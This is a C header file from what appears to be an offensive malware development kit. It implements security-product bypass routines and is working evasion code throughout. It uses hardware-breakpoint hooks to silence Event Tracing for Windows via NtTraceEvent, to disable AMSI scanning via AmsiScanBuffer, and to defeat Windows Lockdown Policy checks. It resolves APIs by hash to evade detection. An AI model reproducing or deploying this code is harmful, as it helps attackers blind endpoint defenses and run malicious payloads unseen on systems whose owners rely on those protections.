/**
 * @file Bypass.h
 * @author Ky4meru (@ky4meru)
 * @brief Security product bypass routines.
 * @version 0.4
 * @date 2026-10-19
 * @copyright Copyright (c) 2024-2026
 */

#ifndef _MDK_BYPASS_H_
#define _MDK_BYPASS_H_

#include "Breakpoints.h"
#include "Log.h"

/// @private
MDK_TEXT_SEC(MDK) MDK_INLINE_ASSEMBLY static VOID MdkBypassReturnZeroHook(VOID)
{
    __asm
    {
        sub rsp, 0x8
        xor eax, eax
        ret
    }
}

/// @private
MDK_TEXT_SEC(MDK) MDK_INLINE_ASSEMBLY static VOID MdkBypassWldpClassHook(VOID)
{
    __asm
    {
        sub rsp, 0x8
        mov dword ptr [r8], 0x1
        xor eax, eax
        ret
    }
}

/**
 * @brief Patches NtTraceEvent using a hardware breakpoint to suppress Event Tracing for Windows (ETW).
 *
 * The hardware breakpoints engine must be started before calling this function.
 *
 * @param drx The debug register index to use (0 to 3).
 * @return If the function succeeds, the return value is nonzero.
 */
MDK_TEXT_SEC(MDK) static BOOL MdkPatchEtw(_In_ DWORD drx)
{
    MDK_LOG_DEBUG("Calling with (drx=%lu)", drx);

    MDK_DECL_DLL(Ntdll);
    MDK_DECL_PROC(NtTraceEvent);

    LPVOID gate = MDK_GET_PROC(Ntdll, NtTraceEvent);

    if (!gate)
    {
        MDK_LOG_DEBUG("Failed to resolve NtTraceEvent");
        return FALSE;
    }

    MDK_LOG_DEBUG("Resolved NtTraceEvent at 0x%p", gate);

    if (!MdkInsertPersistentHardwareBreakpoint(MdkCurrentProcess(), gate, MDK_CAST_VPTR(MdkBypassReturnZeroHook), drx))
    {
        MDK_LOG_DEBUG("Failed");
        return FALSE;
    }

    MDK_LOG_DEBUG("Successfully finished");

    return TRUE;
}

/**
 * @brief Patches AmsiScanBuffer using a hardware breakpoint to bypass the Antimalware Scan Interface (AMSI).
 *
 * The hardware breakpoints engine must be started before calling this function.
 *
 * @param drx The debug register index to use (0 to 3).
 * @return If the function succeeds, the return value is nonzero.
 */
MDK_TEXT_SEC(MDK) static BOOL MdkPatchAmsi(_In_ DWORD drx)
{
    MDK_DECL_DLL(Amsi);
    MDK_DECL_PROC(AmsiScanBuffer);

    LPVOID module = MdkGetModuleHandleByHash(MDK_HASH_Amsi);

    if (!module)
    {
        module = MdkLoadDll(L"amsi.dll");
    }

    if (!module)
    {
        return FALSE;
    }

    LPVOID gate = MdkGetProcAddressByHash(module, MDK_HASH_AmsiScanBuffer);

    if (!gate)
    {
        return FALSE;
    }

    return MdkInsertPersistentHardwareBreakpoint(MdkCurrentProcess(), gate, MDK_CAST_VPTR(MdkBypassReturnZeroHook), drx);
}

/**
 * @brief Patches WldpQueryDynamicCodeTrust and WldpIsClassInApprovedList using hardware breakpoints to bypass the Windows Lockdown Policy (WLDP).
 *
 * The hardware breakpoints engine must be started before calling this function.
 *
 * @param drx1 The debug register index to use for WldpQueryDynamicCodeTrust (0 to 3).
 * @param drx2 The debug register index to use for WldpIsClassInApprovedList (0 to 3).
 * @return If the function succeeds, the return value is nonzero.
 */
MDK_TEXT_SEC(MDK) static BOOL MdkPatchWldp(_In_ DWORD drx1, _In_ DWORD drx2)
{
    MDK_DECL_DLL(Wldp);
    MDK_DECL_PROC(WldpQueryDynamicCodeTrust);
    MDK_DECL_PROC(WldpIsClassInApprovedList);

    LPVOID module = MdkGetModuleHandleByHash(MDK_HASH_Wldp);

    if (!module)
    {
        module = MdkLoadDll(L"wldp.dll");
    }

    if (!module)
    {
        return FALSE;
    }

    LPVOID gate1 = MdkGetProcAddressByHash(module, MDK_HASH_WldpQueryDynamicCodeTrust);
    LPVOID gate2 = MdkGetProcAddressByHash(module, MDK_HASH_WldpIsClassInApprovedList);

    if (!gate1 || !gate2)
    {
        return FALSE;
    }

    if (!MdkInsertPersistentHardwareBreakpoint(MdkCurrentProcess(), gate1, MDK_CAST_VPTR(MdkBypassReturnZeroHook), drx1))
    {
        return FALSE;
    }

    if (!MdkInsertPersistentHardwareBreakpoint(MdkCurrentProcess(), gate2, MDK_CAST_VPTR(MdkBypassWldpClassHook), drx2))
    {
        MdkRemoveHardwareBreakpoint(MdkCurrentProcess(), drx1);
        return FALSE;
    }

    return TRUE;
}

#endif // _MDK_BYPASS_H_
